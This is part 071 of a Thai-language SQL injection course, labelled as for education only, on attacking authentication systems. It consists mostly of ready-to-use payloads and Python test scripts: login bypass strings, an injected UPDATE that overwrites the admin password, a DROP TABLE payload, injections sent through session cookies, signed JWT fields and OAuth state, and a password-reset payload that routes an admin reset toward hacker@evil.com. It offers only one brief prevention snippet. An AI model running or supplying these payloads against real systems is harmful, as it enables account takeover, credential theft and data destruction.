# Part 071: SQL Injection ใน Authentication Systems

## ภาพรวม

เทคนิค SQL injection ใน authentication, JWT, OAuth

**ขั้นตอนที่ 1136-1150**

---

## 1136. Login Form Injection

```sql
-- ผ่าน login form ที่เชัค credentials:
-- SELECT * FROM users WHERE user='$u' AND pass='$p'

-- Auth Bypass payloads:
Username: ' OR 1=1 LIMIT 1-- -
Username: admin'-- -
Username: ' OR '1'='1
Username: 1' OR '1'='1
Username: admin'#
Username: ') OR ('1'='1

-- ผ่าน password แทน:
Password: ' OR '1'='1
Password: anything' OR 1=1-- -

-- Multi-statement (MSSQL/MySQL เป็นต้น):
Username: admin'; UPDATE users SET pass='hack' WHERE user='admin'-- -
```

---

## 1137. Session Token SQLi

```python
import requests
import base64
import json

# เมื่อ session token ถูกดึงจาก DB โดย query:
# SELECT user_id FROM sessions WHERE token = '$token'

def test_session_sqli(url: str):
    # Plain session token
    payloads = [
        "valid_session' UNION SELECT 1-- -",
        "xxx' OR '1'='1",
        "' OR 1=1 LIMIT 1-- -",
    ]
    
    for payload in payloads:
        r = requests.get(
            url,
            cookies={'session': payload},
            timeout=5
        )
        if 'Welcome' in r.text or r.status_code == 200:
            print(f"[+] Session bypass: {payload[:50]}")
    
    # Base64 encoded token
    raw_payload = b"xxx' OR '1'='1"
    encoded = base64.b64encode(raw_payload).decode()
    r = requests.get(url, cookies={'session': encoded}, timeout=5)
    print(f"Base64 session: {r.status_code}")
```

---

## 1138. Password Reset SQLi

```sql
-- /forgot-password?email=user@example.com
-- vulnerable code:
-- SELECT * FROM users WHERE email = '$email'
-- + UPDATE users SET reset_token = ... WHERE id = $user_id

-- Attack:
-- เปลี่ยน email condition เพื่อ reset password สำหรับ admin

-- Payload (email field):
admin@example.com' AND '1'='2
-- ผล: ไม่เจอ user = ไม่ reset

admin@example.com'-- -
-- ผล: หาเจอ admin และส่ง reset link ไปให้ attacker

-- ถ้า reset code ถูกส่งไป email และเอา email reset ของ attacker:
hacker@evil.com' UNION SELECT 1,2,email,4,5 FROM users WHERE role='admin' LIMIT 1-- -
```

---

## 1139. JWT และ SQLi

```python
import jwt
import requests

# เมื่อ server decode JWT แล้วนำ user_id ไป query:
# SELECT * FROM users WHERE id = $payload['user_id']

def test_jwt_sqli(url: str, secret: str):
    # สร้าง JWT ที่มี payload injection
    sqli_payloads = [
        "1 OR 1=1",
        "1 UNION SELECT 1,username,password FROM users LIMIT 1-- -",
        "1; DROP TABLE sessions-- -",
        "1 AND SLEEP(3)-- -",
    ]
    
    for payload in sqli_payloads:
        token = jwt.encode(
            {'user_id': payload, 'role': 'user'},
            secret,
            algorithm='HS256'
        )
        
        r = requests.get(
            url,
            headers={'Authorization': f'Bearer {token}'},
            timeout=8
        )
        print(f"Payload: {payload[:40]} -> {r.status_code}")

# Prevention:
def safe_jwt_handler(token: str, secret: str) -> dict:
    payload = jwt.decode(token, secret, algorithms=['HS256'])
    user_id = int(payload['user_id'])  # ค่อย cast เป็น int
    return {'user_id': user_id}  # จะ raise ValueError ถ้าไม่ใช่ตัวเลข
```

---

## 1140. OAuth State Parameter

```sql
-- OAuth flow: GET /oauth/callback?code=xxx&state=PAYLOAD
-- ถ้า state ถูกเก็บแล้ว query โดยไม่ sanitize:
-- SELECT * FROM oauth_states WHERE state='$state'

-- Payloads:
state=' UNION SELECT 1,2,3--
state=xxx' OR '1'='1
state='; SELECT * FROM users--
```

---

## สรุป

Authentication SQL Injection:
- **Login bypass** - classic OR 1=1
- **Session tokens** - direct token injection
- **Password reset** - email parameter injection
- **JWT** - inject ใน decoded payload fields
- **OAuth** - state parameter injection

---

*Part 071 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
